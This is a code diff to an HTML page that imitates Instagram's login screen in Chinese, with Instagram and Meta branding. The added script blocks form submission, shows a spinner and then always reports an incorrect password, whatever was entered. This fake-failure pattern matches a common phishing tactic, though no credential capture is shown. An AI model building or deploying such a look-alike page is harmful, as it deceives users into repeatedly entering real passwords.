@@ -33,7 +33,10 @@
                     <label for="password">密碼</label>
                 </div>
                 <div class="form-content">
-                    <button type="submit">登入</button>
+                    <button type="submit">
+                        <span class="button-text">登入</span>
+                        <span class="spinner" style="display: none;"></span>
+                    </button>
                 </div>
                 <div class="form-ending">
                     <center>
@@ -166,7 +169,51 @@
         <span> &copy 2024 Instagram from Meta </span>
     </div>
 </footer>
+
+<script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+      e.preventDefault(); // 防止表單提交
+
+      const buttonText = document.querySelector('.button-text');
+      const spinner = document.querySelector('.spinner');
+      const submitButton = document.querySelector('button[type="submit"]');
+
+      // 隱藏 "登入" 文字，顯示旋轉動畫
+      buttonText.style.display = 'none';
+      spinner.style.display = 'inline-block';
+      submitButton.disabled = true;
+
+      // 模擬登入請求
+      setTimeout(function() {
+        const errorMessage = document.querySelector('.error-message');
+
+        if (errorMessage) {
+          // 如果錯誤訊息已經存在，直接更新訊息內容
+          errorMessage.textContent = '很抱歉，你的密碼不正確，請再次檢查密碼。';
+        } else {
+          // 如果錯誤訊息不存在，創建一個新的錯誤訊息元素
+          const newErrorMessage = document.createElement('p');
+          newErrorMessage.textContent = '很抱歉，你的密碼不正確，請再次檢查密碼。';
+          newErrorMessage.classList.add('error-message');
+
+          // 設置錯誤訊息的樣式
+          newErrorMessage.style.color = 'red';
+          newErrorMessage.style.margin = '10px 40px';
+          newErrorMessage.style.fontSize = '14px';
+          newErrorMessage.style.lineHeight = '18px';
+          newErrorMessage.style.textAlign = 'center';
+
+          const facebookLink = document.querySelector('#facebook');
+          facebookLink.parentNode.insertBefore(newErrorMessage, facebookLink.nextSibling);
+        }
+
+        // 隱藏旋轉動畫，顯示 "登入" 文字
+        spinner.style.display = 'none';
+        buttonText.style.display = 'inline';
+        submitButton.disabled = false;
+      }, 500);
+    });
+  </script>
+
 </body>
-
-
 </html>
